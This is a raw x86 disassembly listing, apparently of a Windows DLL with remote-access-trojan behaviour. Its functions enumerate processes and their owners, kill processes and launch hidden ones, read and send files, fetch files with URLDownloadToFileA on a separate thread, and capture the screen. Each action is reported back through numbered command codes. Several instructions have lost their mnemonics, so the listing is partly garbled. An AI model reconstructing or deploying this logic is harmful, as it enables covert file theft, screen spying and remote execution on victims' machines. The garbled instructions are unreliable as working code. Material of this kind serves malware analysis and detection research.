mov [ esp + 0x24 ] 0x614
call [ SHFileOperationA@IAT ]
sub_10006ce0
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ esp + 0x10 ]
push eax
push 0x0
push 0x410
mov [ edi ] 0x0
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
retn
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push 0x4
push edx
push esi
call EnumProcessModules
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
push 0x104
push edi
push eax
push esi
call GetModuleFileNameExA
sub_10006d40
sub esp 0x610
mov eax [ esp + 0x614 ]
push esi
push edi
mov edi [ esp + 0x620 ]
push eax
push 0x0
push 0x400
mov [ edi ] 0x20
mov [ edi + 0x1 ] 0x0
mov [ esp + 0x18 ] 0x200
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
add esp 0x610
retn
lea ecx [ esp + 0x8 ]
push ebp
push ecx
push 0x8
push esi
mov [ esp + 0x18 ] 0x0
call [ OpenProcessToken@IAT ]
mov ebp [ CloseHandle@IAT ]
test eax eax
je r-xdata
push esi
call ebp
pop ebp
mov ecx [ esp + 0xc ]
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x220 ]
push 0x400
push eax
push 0x1
push ecx
mov [ esp + 0x28 ] 0x400
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push ecx
call ebp
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x224 ]
lea edx [ esp + 0x630 ]
push ecx
push edx
push edi
push eax
push 0x0
call [ LookupAccountSidA@IAT ]
sub_10006e10
sub esp 0x338
call sub_10005f00
test eax eax
jle r-xdata
mov ecx [ esp + 0x33c ]
push 0x0
lea eax [ esp + 0x8 ]
push 0x4
push eax
push 0xffffffff
push 0xa001
mov [ esp + 0x18 ] 0xffffffff
call sub_10001f60
mov eax 0x4
add esp 0x338
retn
add eax 0x4
push ebx
mov ecx eax
push ebp
shl ecx 0x6
add ecx eax
push esi
push edi
lea ebx [ eax + ecx * 2 ]
shl ebx 0x2
push ebx
call ??2@YAPAXI@Z
mov ecx ebx
mov ebp eax
mov edx ecx
xor eax eax
mov edi ebp
add esp 0x4
shr ecx 0x2
[ edi ]
mov ecx edx
mov esi ebp
and ecx 0x3
push 0x0
[ edi ]
push 0x2
mov [ esp + 0x20 ] esi
call CreateToolhelp32Snapshot
mov edx eax
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x20 ]
[ edi ]
lea eax [ esp + 0x1c ]
mov [ esp + 0x10 ] edx
push eax
push edx
mov [ esp + 0x24 ] 0x128
call Process32First
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ CloseHandle@IAT ]
mov [ ebp ] 0xffffffff
mov ecx [ esp + 0x34c ]
sub ebp esi
push 0x0
add ebp 0x4
push ebp
push esi
push ebx
push 0xa001
call sub_10001f60
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x338
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
call Process32Next
test eax eax
jne r-xdata
lea ecx [ esp + 0x144 ]
mov [ esp + 0x144 ] 0x0
push ecx
push eax
call sub_10006ce0
mov edx [ esp + 0x2c ]
add esp 0x8
mov [ ebp ] edx
mov al [ esp + 0x144 ]
add ebp 0x4
test al al
jne r-xdata
lea edi [ esp + 0x144 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x144 ]
lea edi [ esp + 0x40 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x40 ]
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x248 ] al
lea eax [ esp + 0x248 ]
push 0x100
lea ebp [ ecx + ebp + 0x1 ]
mov ecx [ esp + 0x28 ]
push eax
push ecx
call sub_10006d40
lea edi [ esp + 0x254 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x248 ]
or ecx 0xffffffff
[ edi ]
mov esi [ esp + 0x18 ]
not ecx
dec ecx
lea ebp [ ecx + ebp + 0x1 ]
sub_10007020
sub esp 0x10c
mov ecx 0x41
xor eax eax
push esi
mov esi [ esp + 0x114 ]
push edi
lea edi [ esp + 0x10 ]
[ edi ]
mov edi [ esp + 0x11c ]
lea eax [ esp + 0x10 ]
push edi
push eax
mov ecx esi
call sub_10001870
cmp eax edi
jne r-xdata
pop edi
pop esi
add esp 0x10c
retn
lea ecx [ esp + 0x10 ]
push ecx
call [ LoadLibraryA@IAT ]
mov [ esp + 0xc ] 0x0
mov [ esp + 0x8 ] eax
call [ GetLastError@IAT ]
push 0x0
lea edx [ esp + 0xc ]
push 0x8
push edx
push 0xffffffff
push 0xa020
mov ecx esi
mov [ esp + 0x20 ] eax
call sub_10001f60
sub_100070a0
sub esp 0x2ac
mov ecx 0x41
xor eax eax
push ebx
mov ebx [ esp + 0x2b4 ]
push esi
mov esi [ esp + 0x2bc ]
push edi
lea edi [ esp + 0x1b4 ]
[ edi ]
lea eax [ esp + 0x1b4 ]
push esi
push eax
mov ecx ebx
call sub_10001870
cmp eax esi
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x2ac
retn
mov ecx 0x1a
xor eax eax
lea edi [ esp + 0xc ]
[ edi ]
lea ecx [ esp + 0x1b4 ]
push ecx
call [ GetFileAttributesA@IAT ]
mov [ esp + 0x2c ] eax
mov ecx 0x50
xor eax eax
lea edi [ esp + 0x74 ]
[ edi ]
lea edx [ esp + 0x74 ]
lea eax [ esp + 0x1b4 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x0
lea eax [ esp + 0x10 ]
push 0x68
push eax
push 0xffffffff
push 0xa022
mov ecx ebx
call sub_10001f60
mov ecx [ esp + 0x94 ]
mov edx [ esp + 0x90 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x78 ]
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x7c ]
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x80 ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x84 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x88 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x8c ]
push eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] edx
call [ FindClose@IAT ]
sub_100071a0
mov eax [ esp + 0x4 ]
push esi
push eax
push 0x0
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
retn
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_100071d0
sub esp 0x58
push ebp
mov ebp [ esp + 0x64 ]
push esi
push edi
test ebp ebp
jg r-xdata
lea edi [ ebp + 0x1 ]
push edi
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0xc ] esi
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x58
retn
mov ecx edi
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
[ edi ]
mov ecx [ esp + 0x70 ]
call sub_10001870
cmp eax ebp
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x58
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x68 ] esi
[ edi ]
not ecx
dec ecx
cmp ecx 0x104
jb r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
add esp 0x58
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
dec ecx
add ebp 0x10
push ebp
mov bl [ esi + ecx + 0x1 ]
lea esi [ esi + ecx + 0x1 ]
inc esi
mov [ esp + 0x74 ] esi
call ??2@YAPAXI@Z
mov ebp eax
or ecx 0xffffffff
mov edi rw-data
xor eax eax
add esp 0x4
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi ebp
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x6c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x70 ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ eax ] 0x0
je r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
add esp 0x58
retn
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x24 ]
[ edi ]
test bl bl
mov [ esp + 0x24 ] 0x44
mov [ esp + 0x54 ] ax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x70 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x24 ]
neg bl
push eax
push ecx
sbb ebx ebx
push 0x0
and ebx 0x8000000
push 0x0
push ebx
push 0x0
push 0x0
push 0x0
push ebp
push 0x0
call [ CreateProcessA@IAT ]
push ebp
call ??3@YAXPAX@Z
mov edx [ esp + 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x8
mov eax 0x1
pop ebx
pop edi
pop esi
pop ebp
add esp 0x58
retn
mov [ esp + 0x50 ] 0x1
sub_100073d0
sub esp 0x124
mov edx [ esp + 0x128 ]
push ebx
push esi
push edi
lea edi [ edx + 0x8 ]
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x2c ]
[ edi ]
not ecx
sub edi ecx
push edx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx ]
mov [ esp + 0x18 ] ecx
call ??3@YAXPAX@Z
add esp 0x4
lea edx [ esp + 0x2c ]
mov [ rw-data ] 0x1
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edx
call [ CreateFileA@IAT ]
mov ebx eax
or esi 0xffffffff
or edi 0xffffffff
cmp ebx 0xffffffff
je r-xdata
push ebp
push 0x0
push 0x400
push edi
push esi
call sub_10009ad0
push 0x0
push 0x400
mov ebp edx
push edi
push esi
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] ebp
call sub_10009a10
push 0x400
mov [ esp + 0x14 ] eax
call ??2@YAPAXI@Z
mov esi eax
mov ecx 0x100
xor eax eax
mov edi esi
[ edi ]
xor edi edi
add esp 0x4
cmp ebp edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
jb r-xdata
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x0
push eax
push ebx
call [ GetFileSize@IAT ]
mov edi [ esp + 0xc ]
xor esi esi
xor ecx ecx
or esi eax
or edi ecx
mov edi [ esp + 0x10 ]
pop ebp
test edi edi
jle r-xdata
ja r-xdata
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ esp + 0x24 ] edi
jbe r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea edx [ esp + 0x2c ]
push 0x0
push edx
push 0x400
push esi
push ebx
call [ ReadFile@IAT ]
fild [ esp + 0x1c ]
fild [ esp + 0x24 ]
fdivp st1
fmul [ r--data ]
call _ftol
mov ecx [ esp + 0x18 ]
push eax
push 0x400
push esi
push 0xffffffff
push 0xa00f
call sub_10001f60
test eax eax
jle r-xdata
lea ecx [ esp + 0x28 ]
push 0x0
push ecx
push edi
push esi
push ebx
call [ ReadFile@IAT ]
push 0x0
push edi
mov edi [ esp + 0x1c ]
push esi
push 0xffffffff
push 0xa00f
mov ecx edi
call sub_10001f60
test eax eax
jg r-xdata
mov [ esp + 0x14 ] 0x1
mov edx [ esp + 0x1c ]
add edx 0x1
adc edi 0x0
mov [ esp + 0x1c ] edx
cmp edi ebp
mov [ esp + 0x20 ] edi
jb r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
push ebx
call [ CloseHandle@IAT ]
push 0x0
lea edx [ esp + 0x14 ]
push 0x4
push edx
push 0xffffffff
push 0xa010
mov ecx edi
call sub_10001f60
mov eax [ edi + 0x1c ]
push eax
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebx
add esp 0x124
retn
mov [ esp + 0x10 ] 0x1
jmp r-xdata
ja r-xdata
mov eax [ esp + 0x24 ]
mov ecx edx
cmp ecx eax
jb r-xdata
jmp r-xdata
sub_100075d0
sub esp 0x104
mov ecx 0x41
xor eax eax
push esi
mov esi [ esp + 0x110 ]
push edi
lea edi [ esp + 0x8 ]
[ edi ]
mov edi [ esp + 0x110 ]
lea eax [ esp + 0x8 ]
push esi
push eax
mov ecx edi
call sub_10001870
cmp eax esi
jne r-xdata
pop edi
pop esi
add esp 0x104
retn
push ebx
push 0x210
call ??2@YAPAXI@Z
mov edx eax
or ecx 0xffffffff
xor eax eax
push edx
mov [ edx ] edi
lea edi [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
lea ebx [ edx + 0x8 ]
mov eax ecx
mov esi edi
mov edi ebx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push sub_100073d0
and ecx 0x3
[ edi ] [ esi ]
call [ _beginthread@IAT ]
add esp 0x10
pop ebx
sub_10007660
mov edx [ esp + 0x4 ]
push edi
cmp [ edx ] 0x5c
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x1
jle r-xdata
cmp [ edx + 0x1 ] 0x5c
jne r-xdata
xor eax eax
pop edi
retn
cmp [ edx + 0x1 ] 0x3a
jne r-xdata
mov al [ edx + 0x2 ]
add edx 0x2
cmp al 0x5c
jne r-xdata
cmp ecx 0x2
jne r-xdata
mov cl [ edx ]
push esi
xor esi esi
mov eax 0x1
test cl cl
mov edi edx
je r-xdata
cmp ecx 0x3
jne r-xdata
mov eax 0x1
pop edi
retn
pop esi
pop edi
retn
cmp cl 0x5c
jne r-xdata
jl r-xdata
mov cl [ edx + 0x2 ]
xor eax eax
cmp cl 0x5c
pop edi
sete al
retn
inc edx
inc esi
test esi esi
je r-xdata
add edx 0x3
cmp [ edx + 0x2 ] 0x5c
jne r-xdata
pop esi
pop edi
retn
xor eax eax
cmp esi 0x1
jne r-xdata
cmp esi 0x2
jne r-xdata
cmp [ edi ] 0x2e
je r-xdata
lea edi [ edx + 0x1 ]
xor esi esi
mov edx edi
jmp r-xdata
cmp [ edi ] 0x2e
jne r-xdata
lea edi [ edx + 0x1 ]
xor esi esi
mov edx edi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
cmp [ edi + 0x1 ] 0x2e
je r-xdata
sub_10007720
sub esp 0x108
push ebx
mov ebx [ esp + 0x110 ]
push esi
push edi
push ebx
call sub_10007660
add esp 0x4
test eax eax
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x3
ja r-xdata
pop edi
pop esi
pop ebx
add esp 0x108
retn
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x10 ] 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ strchr@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
call edi
mov cl [ ebx ]
add esp 0x8
cmp cl 0x5c
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x108
retn
push ebp
inc eax
push 0x5c
push eax
call edi
mov ebx [ CreateDirectoryA@IAT ]
mov ebp [ GetLastError@IAT ]
add esp 0x8
mov esi eax
cmp [ ebx + 0x1 ] 0x5c
jne r-xdata
lea eax [ esp + 0x14 ]
push 0x0
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi ] 0x0
lea edx [ esp + 0x12 ]
push 0x5c
push edx
call edi
add esp 0x8
test eax eax
jne r-xdata
test esi esi
je r-xdata
call ebp
cmp eax 0xb7
jne r-xdata
inc eax
push 0x5c
push eax
call edi
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x108
retn
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x108
retn
mov [ esi ] 0x5c
inc esi
push 0x5c
push esi
call edi
add esp 0x8
mov esi eax
jmp r-xdata
pop ebp
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x108
retn
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x108
retn
test esi esi
je r-xdata
sub_10007850
sub esp 0x824
mov ecx 0x82
xor eax eax
push ebp
mov ebp [ esp + 0x82c ]
push esi
mov esi [ esp + 0x834 ]
push edi
lea edi [ esp + 0x218 ]
[ edi ]
lea eax [ esp + 0x218 ]
push esi
push eax
mov ecx ebp
call sub_10001870
cmp eax esi
jne r-xdata
pop edi
pop esi
pop ebp
add esp 0x824
retn
or ecx 0xffffffff
lea edi [ esp + 0x218 ]
xor eax eax
lea edx [ esp + 0x420 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x628 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x218 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + ecx + 0x219 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x420 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp [ esp + ecx + 0xf ] 0x5c
je r-xdata
lea edi [ esp + 0x628 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0xc ] 0x1
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov al [ esp + 0x420 ]
mov ecx edx
and ecx 0x3
test al al
[ edi ] [ esi ]
je r-xdata
mov [ esp + ecx + 0x10 ] 0x5c
mov [ esp + ecx + 0x11 ] 0x0
push 0x0
lea edx [ esp + 0x10 ]
push 0x4
push edx
push 0xffffffff
push 0xa010
mov ecx ebp
call sub_10001f60
mov al [ esp + 0x628 ]
test al al
je r-xdata
lea eax [ esp + 0x420 ]
push eax
call sub_10007720
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x3
lea ecx [ esp + 0x24 ]
push 0xc0000000
push ecx
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x1c ]
push eax
call [ SetEvent@IAT ]
mov [ ebp + 0x24 ] eax
mov eax [ ebp + 0x1c ]
push eax
mov [ esp + 0x10 ] 0x0
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebp
add esp 0x824
retn
sub_10007a20
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push eax
lea edi [ ecx + esi + 0x1 ]
call [ OleInitialize@IAT ]
push 0x0
push 0x0
push edi
push esi
push 0x0
call URLDownloadToFileA
push esi
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
pop edi
pop esi
retn 0x4
sub_10007a60
sub esp 0x108
push ebx
mov ebx [ esp + 0x114 ]
push ebp
push esi
cmp ebx 0x3
push edi
jle r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x108
retn
lea esi [ ebx + 0x8 ]
push esi
call ??2@YAPAXI@Z
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
push ebp
[ edi ]
mov ecx [ esp + 0x124 ]
call sub_10001870
cmp eax ebx
jne r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edx ecx
cmp edx 0x104
jge r-xdata
cmp edx 0x1
jle r-xdata
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
lea esi [ esp + 0x14 ]
sub edi ecx
mov eax ecx
mov [ esp + 0x10 ] esi
mov esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ esp + edx + 0x13 ] 0x5c
je r-xdata
lea esi [ ebx + 0x104 ]
push esi
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov [ esp + edx + 0x14 ] 0x5c
mov [ esp + edx + 0x15 ] 0x0
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push 0x2f
and ecx 0x3
push ebx
[ edi ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ ecx + ebp + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ strrchr@IAT ]
call esi
mov edx eax
add esp 0x8
test edx edx
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x14 ]
mov esi ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add esi ecx
cmp esi 0x104
jb r-xdata
push 0x2f
push ebx
call esi
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ edx + 0x1 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea esi [ esp + 0x14 ]
mov edi esi
lea edx [ ecx + ebx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push ebx
push sub_10007a20
push 0x0
push 0x0
call [ CreateThread@IAT ]
push ebp
call ??3@YAXPAX@Z
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x108
retn
push ebx
call ??3@YAXPAX@Z
add esp 0x4
push ebp
call ??3@YAXPAX@Z
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x108
retn
sub_10007c90
push ebx
push esi
mov esi ecx
push edi
xor ebx ebx
push 0x428
mov [ esi ] r--data
mov [ esi + 0x30 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call ??2@YAPAXI@Z
add esp 0x4
mov edi eax
mov ecx 0x10a
xor eax eax
mov [ esi + 0x24 ] edi
push ebx
[ edi ]
mov edi [ CreateEventA@IAT ]
push 0x1
push 0x1
push ebx
mov [ esi + 0x18 ] ebx
call edi
push ebx
push 0x1
push 0x1
push ebx
mov [ esi + 0x8 ] eax
call edi
push rw-data
push rw-data
mov [ esi + 0xc ] eax
mov [ esi + 0x44 ] ebx
mov [ esi + 0x48 ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x58 ] ebx
mov [ esi + 0x1c ] ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_10007d60
push ebx
push esi
mov esi ecx
xor ebx ebx
mov eax [ esi + 0x30 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x28 ]
push edi
mov edi [ DeleteDC@IAT ]
cmp eax ebx
je r-xdata
push eax
call [ DeleteObject@IAT ]
mov eax [ esi + 0x2c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov eax [ esi + 0x44 ]
pop edi
cmp eax ebx
je r-xdata
push eax
call edi
mov eax [ esi + 0x48 ]
cmp eax ebx
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x58 ]
cmp eax ebx
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi + 0x30 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x48 ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x58 ] ebx
pop esi
pop ebx
retn
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_10007df0
mov eax [ esp + 0x8 ]
sub esp 0x18
cmp eax 0x4
push ebx
mov ebx [ esp + 0x20 ]
push esi
mov esi ecx
push edi
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] eax
je r-xdata
mov eax [ esi + 0x14 ]
push 0x0
mov [ esi + 0x4 ] eax
call [ CreateCompatibleDC@IAT ]
push 0x0
push 0x0
push 0x0
push rw-data
mov [ esi + 0x2c ] eax
call [ CreateDCA@IAT ]
mov edi [ GetDeviceCaps@IAT ]
push 0x8
push eax
mov [ esi + 0x28 ] eax
call edi
mov ecx [ esi + 0x28 ]
push 0xa
push ecx
mov [ esi + 0x34 ] eax
call edi
mov edx [ esi + 0x34 ]
mov [ esi + 0x38 ] eax
push eax
mov eax [ esi + 0x28 ]
push edx
push eax
call [ CreateCompatibleBitmap@IAT ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x30 ] eax
imul ecx [ esi + 0x34 ]
shl ecx 0x2
push ecx
call ??2@YAPAXI@Z
mov edx [ esi + 0x38 ]
mov [ esi + 0x44 ] eax
imul edx [ esi + 0x34 ]
shl edx 0x2
push edx
call ??2@YAPAXI@Z
mov edi [ esi + 0x44 ]
add esp 0x8
test edi edi
mov [ esi + 0x48 ] eax
je r-xdata
cmp eax 0x8
je r-xdata
mov edi [ esi + 0x48 ]
test edi edi
je r-xdata
mov ecx [ esi + 0x38 ]
xor eax eax
imul ecx [ esi + 0x34 ]
shl ecx 0x2
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
cmp eax 0x10
je r-xdata
mov ecx [ esi + 0x34 ]
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
lea ecx [ edx + eax + 0x1 ]
mov edx [ esi + 0x38 ]
mov eax 0x66666667
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
lea edi [ edx + eax + 0x1 ]
imul edi ecx
lea ecx [ edi + edi + 0x4 ]
push ecx
call ??2@YAPAXI@Z
mov edx [ esi + 0x38 ]
mov [ esi + 0x4c ] eax
